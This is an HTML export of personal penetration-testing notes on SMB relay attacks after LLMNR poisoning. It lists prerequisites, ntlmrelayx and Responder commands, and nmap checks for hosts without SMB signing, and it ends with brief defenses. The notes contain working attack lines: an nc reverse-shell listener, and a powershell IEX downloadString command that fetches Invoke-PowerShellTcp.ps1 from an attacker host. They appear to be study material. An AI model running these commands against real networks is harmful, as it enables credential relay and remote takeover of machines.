<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>08-smb relay</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>08-smb relay</h1><br/><p><h2>What is SMB relay ?</h2><ul><li><h3>after LLMNR poisonning instead of cracking hashes we can relay them to another machines =&gt; gain access of system </h3><ul><li><h3>: hashes (SAM hashes ) / shell  </h3></li></ul></li></ul><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>Requirements ?</h2><ul><li>  <h3>SMB signing must be disabled </h3></li><li><h3> relayed user credentials must be admin on machine </h3></li></ul><h3></h3></p><p><h3></h3> <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## kali</span><br />sudo <span style="color:#00117f;font-weight:400">impacket-ntlmrelayx</span> <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">no-http-server</span> <span style="color:#ff9d00;font-weight:700">-</span>smb2support <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#0088ff;font-weight:400">$target</span> <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#3ad900;font-weight:400">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span><br /><span style="color:#0088ff;font-weight:400">## start revshell</span><br />nc <span style="color:#ff9d00;font-weight:700">-</span>nvlp <span style="color:#333333;font-weight:400">8080</span><br /><br /><span style="color:#0088ff;font-weight:400">## on victim </span><br /><span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">119.2</span><span style="color:#0088ff;font-weight:400">$lhost</span></pre></div></p><p><h3></h3></p><p><h3></h3><h2>Exploitation</h2><ul><li><h3>Responder.conf : SMB=off HTTP=off</h3></li><li><h3>We are listening + relay  but not responding </h3><ul><li><h3> sudo python3 /usr/share/responder/Responder.py -I eth0 -dw</h3></li><li><h3>python3 -m http.server 8080</h3></li><li><h3>ntlmrelayx.py -tf /home/hernan/target.txt -smb2support -i  </h3></li><li><h3> ntlmrelayx.py -tf /home/hernan/target.txt -smb2support -c &quot;powershell IEX(New-Object</h3></li></ul></li></ul><h3></h3></p><p><h3>Net.WebClient).downloadString(&#39;</h3><h3>http://192.168.1.6:8080/Invoke-PowerShellTcp.ps1&#39;)</h3><h3>&quot;</h3><ul><li><h3>// targets = list of expoloitable ips </h3></li><li><h3>// -i :  interactive to get a SMB shell </h3></li></ul><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>Discovering machines that have smb signed disabled</h2><ul><li><h3>nmap -sC -sV</h3></li><li><h3>nmap --script=smb2-security-mod.nse</h3></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><strong><h3></h3></strong></p><p><strong><h3></h3></strong><h2>Defenses :</h2><ul><li><h3> enable smb signing on all machines</h3><ul><li><h3> cons : longer time for file copy</h3></li></ul></li><li><h3>disable NTLM auth </h3><ul><li><h3> cons : if kerberos fail =&gt;windows will rollback to NTLM </h3></li></ul></li></ul><h3></h3></p><p><h3> </h3></p><p></p><p></p></div>
</body>
</html>
